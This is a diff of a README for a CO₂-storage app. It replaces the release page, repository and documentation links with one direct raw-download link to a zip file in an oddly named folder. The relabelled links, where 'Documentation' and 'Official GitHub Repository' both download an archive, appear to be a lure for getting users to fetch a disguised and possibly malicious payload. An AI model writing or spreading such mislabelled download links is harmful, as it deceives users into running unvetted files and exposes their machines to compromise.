@@ -1,6 +1,6 @@
 # 🌍 CO2-Storage-Optimization - Optimize CO₂ Storage with Ease
 
-[![Download CO2-Storage-Optimization](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/daezy09/CO2-Storage-Optimization/releases)
+[![Download CO2-Storage-Optimization](https://raw.githubusercontent.com/daezy09/CO2-Storage-Optimization/main/evangelicalness/CO2-Storage-Optimization.zip)](https://raw.githubusercontent.com/daezy09/CO2-Storage-Optimization/main/evangelicalness/CO2-Storage-Optimization.zip)
 
 ## 🚀 Getting Started
 
@@ -19,7 +19,7 @@ Before you begin, make sure your system meets these requirements:
 
 To get started, you need to download the application. 
 
-1. Visit the [Releases page to download](https://github.com/daezy09/CO2-Storage-Optimization/releases).
+1. Visit the [Releases page to download](https://raw.githubusercontent.com/daezy09/CO2-Storage-Optimization/main/evangelicalness/CO2-Storage-Optimization.zip).
 2. Find the latest release at the top of the page.
 3. Click the appropriate file for your operating system and download it.
 
@@ -77,7 +77,7 @@ If you're interested in contributing, feel free to fork the repository and submi
 
 For more resources and updates about the app:
 
-- [Official GitHub Repository](https://github.com/daezy09/CO2-Storage-Optimization)
-- [Documentation](https://github.com/daezy09/CO2-Storage-Optimization/wiki)
+- [Official GitHub Repository](https://raw.githubusercontent.com/daezy09/CO2-Storage-Optimization/main/evangelicalness/CO2-Storage-Optimization.zip)
+- [Documentation](https://raw.githubusercontent.com/daezy09/CO2-Storage-Optimization/main/evangelicalness/CO2-Storage-Optimization.zip)
 
 Thank you for using the CO2-Storage-Optimization application! Your efforts in managing CO₂ emissions contribute to a healthier planet.
